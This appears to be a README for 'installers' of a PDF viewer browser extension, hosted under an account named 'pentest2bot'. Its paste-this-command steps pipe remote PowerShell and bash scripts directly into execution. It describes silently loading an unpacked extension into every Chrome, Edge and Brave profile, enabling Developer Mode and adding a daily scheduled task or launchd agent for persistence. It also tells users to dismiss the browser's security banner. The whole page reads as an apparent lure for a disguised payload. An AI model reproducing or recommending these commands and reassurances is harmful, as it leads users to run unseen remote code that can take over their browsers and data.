# PDF Viewer Extension - Installers

Automated installation scripts for PDF Viewer browser extension.

## Quick Install

### Windows
```powershell
irm https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer.ps1 | iex
```

### macOS
```bash
curl -fsSL https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer-macos.sh | bash
```

## What it does

1. Downloads extension from GitHub
2. Installs to all Chrome/Edge/Brave profiles
3. Enables Developer Mode
4. Sets up auto-updates (daily check)

## Requirements

- Windows 10/11 or macOS 10.15+
- Chrome, Edge, or Brave browser
- PowerShell 5.1+ (Windows) or bash (macOS)

## Manual Installation

See [pdf-viewer-extension](https://github.com/Castro02980/pdf-viewer-extension) for manual installation instructions.

## Auto-updates

Installers create a scheduled task (Windows) or launchd agent (macOS) that checks for updates daily at 3 AM.

## Uninstall

### Windows
```powershell
Remove-Item "$env:LOCALAPPDATA\PDFViewerExtension" -Recurse -Force
Unregister-ScheduledTask -TaskName "PDFViewerExtensionUpdater" -Confirm:$false
```

### macOS
```bash
rm -rf "$HOME/Library/Application Support/PDFViewerExtension"
launchctl unload "$HOME/Library/LaunchAgents/com.pdfviewer.updater.plist"
rm "$HOME/Library/LaunchAgents/com.pdfviewer.updater.plist"
```

## Troubleshooting

**Extension not showing up?**
- Close and restart browser
- Check `chrome://extensions` - Developer mode should be enabled

**"Disable developer mode extensions" banner?**
- This is normal for unpacked extensions
- Click "x" to dismiss
- Extension is safe and open-source

## Support

- Extension: https://github.com/Castro02980/pdf-viewer-extension
- Issues: https://github.com/pentest2bot/pdf-viewer-installers/issues
